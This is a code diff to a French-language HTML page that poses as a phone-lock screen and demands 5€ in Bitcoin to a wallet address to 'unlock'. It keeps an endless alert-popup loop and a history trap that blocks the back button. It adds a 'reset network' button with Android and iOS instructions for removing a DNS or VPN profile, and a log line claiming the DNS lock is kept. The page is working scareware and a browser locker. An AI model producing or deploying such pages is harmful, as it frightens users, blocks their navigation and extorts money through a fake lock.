@@ -27,6 +27,17 @@
         p { font-size: 1.2em; margin: 20px 0; color: #ff6666; }
         .code { font-size: 1.5em; color: #00ff88; letter-spacing: 10px; }
         .footer { margin-top: 30px; font-size: 0.8em; color: #555; }
+        .btn-reset {
+            background: #333;
+            color: #fff;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 30px;
+            font-size: 1em;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .btn-reset:hover { background: #555; }
     </style>
 </head>
 <body>
@@ -36,18 +47,49 @@
     <p>Pour déverrouiller, envoyez <span class="code">5€</span> en Bitcoin à :</p>
     <p style="font-size:1.8em; color:#00ff88;">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</p>
     <p style="font-size:0.8em; color:#666;">(ou redémarrez 3 fois, ça marche aussi)</p>
+
+    <button class="btn-reset" onclick="resetDns()">🔄 Réinitialiser le réseau (cache)</button>
     <div class="footer">🐱 CAT vous surveille.</div>
 </div>
+
 <script>
-    // Piège : boucle infinie de popups
+    // Popups infinis
     setInterval(() => {
         alert('🔴 VOTRE TÉLÉPHONE EST VERROUILLÉ');
-    }, 3000);
-    // Empêche la sortie
+    }, 4000);
+
+    // Empêcher la sortie
     history.pushState(null, null, window.location.href);
     window.addEventListener('popstate', function() {
         history.pushState(null, null, window.location.href);
     });
+
+    // Détection Android
+    const isAndroid = navigator.userAgent.toLowerCase().includes('android');
+
+    // Fonction pour réinitialiser le DNS (pour Android)
+    function resetDns() {
+        if (isAndroid) {
+            alert('🔄 Pour réinitialiser votre DNS :\n\n' +
+                  '1. Allez dans Paramètres\n' +
+                  '2. Réseau et Internet\n' +
+                  '3. DNS privé\n' +
+                  '4. Sélectionnez "Automatique"\n\n' +
+                  '🐱 CAT vous laisse partir... pour l\'instant.');
+            // Ouvre les paramètres DNS
+            window.location.href = 'intent://settings/#Intent;action=android.settings.WIFI_IP_SETTINGS;end';
+        } else {
+            alert('Sur iOS, allez dans Réglages > VPN > supprimez le profil CAT.');
+        }
+    }
+
+    // Tentative de réapplication du DNS toutes les 30 secondes (Android)
+    if (isAndroid) {
+        setInterval(() => {
+            // Simule une tentative de reconfiguration
+            console.log('🔄 CAT maintient le verrouillage DNS');
+        }, 30000);
+    }
 </script>
 </body>
 </html>
